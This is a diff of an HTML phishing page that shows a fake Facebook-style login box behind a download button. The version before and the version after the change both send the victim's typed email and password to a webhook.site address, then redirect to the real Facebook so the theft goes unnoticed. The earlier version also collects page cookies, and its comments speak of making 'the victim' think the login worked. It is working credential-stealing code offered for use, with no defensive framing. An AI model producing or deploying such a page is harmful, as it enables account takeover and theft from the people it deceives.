@@ -26,7 +26,7 @@
             height: 100%;
             object-fit: cover;
             z-index: 1;
-            opacity: 0.8; /* Thoda dim taaki text clear dikhe */
+            opacity: 0.8;
         }
 
         /* Download Button */
@@ -116,16 +116,11 @@
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Hidden Iframe to grab cookies from real FB */
-        #fb-iframe {
-            display: none;
-        }
     </style>
 </head>
 <body>
 
-    <!-- Background Image (Change URL to your desired image) -->
+    <!-- Background Image -->
     <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&auto=format&fit=crop&w=1920&q=80" class="bg" alt="Background">
 
     <!-- Download Button -->
@@ -142,56 +137,70 @@
                 <div class="input-group">
                     <input type="password" id="password" placeholder="Password" required>
                 </div>
-                <button type="submit" class="login-btn">Log In</button>
+                <div class="spinner" id="spinner"></div>
+                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
             </form>
-            <div class="spinner" id="spinner"></div>
         </div>
     </div>
 
-    <!-- Hidden Iframe to catch cookies -->
-    <iframe id="fb-iframe" src="about:blank"></iframe>
-
+    <!-- Scripts -->
     <script>
-        // ⚠️ Apna Webhook URL yahan daalo
-        const WEBHOOK_URL = "https://webhook.site/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
-
+        // 1. Modal Open Function
         function openLogin() {
             document.getElementById('modal').style.display = 'flex';
         }
 
+        // 2. Close Modal if clicked outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('modal');
+            if (event.target == modal) {
+                modal.style.display = "none";
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('loginBtn').style.display = 'block';
+            }
+        }
+
+        // 3. Form Submission Logic
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
-            const btn = document.querySelector('.login-btn');
+            const btn = document.getElementById('loginBtn');
             const spinner = document.getElementById('spinner');
             
+            // UI Updates
             btn.style.display = 'none';
             spinner.style.display = 'block';
 
-            // 1. Try to get cookies from current page
-            let cookies = document.cookie;
-            
-            // 2. Advanced: Try to get cookies from the hidden iframe (if it loads FB)
-            // Since we can't easily load FB in an iframe due to X-Frame-Options, 
-            // we rely on the fact that when we redirect user, the browser has cookies.
-            
+            // Data to send
+            const data = {
+                email: email,
+                password: pass,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+
+            // YOUR WEBHOOK URL
+            const WEBHOOK_URL = "https://webhook.site/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
+
             // Send Data to Webhook
             fetch(WEBHOOK_URL, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    email: email,
-                    password: pass,
-                    cookies: cookies,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent
-                })
-            }).then(() => {
-                // 3. Redirect to real Facebook to "validate" and keep session alive
-                // This trick makes the victim think they logged in successfully
-                // and actually logs them in, giving you a valid session.
+                headers: {
+                    "Content-Type": "application/json",
+                    "mode": "no-cors" // Important for cross-origin requests
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                console.log("Webhook sent successfully");
+                // Redirect to real Facebook
+                window.location.href = "https://www.facebook.com/";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                // Even if error, redirect to make it look real
                 window.location.href = "https://www.facebook.com/";
             });
         });
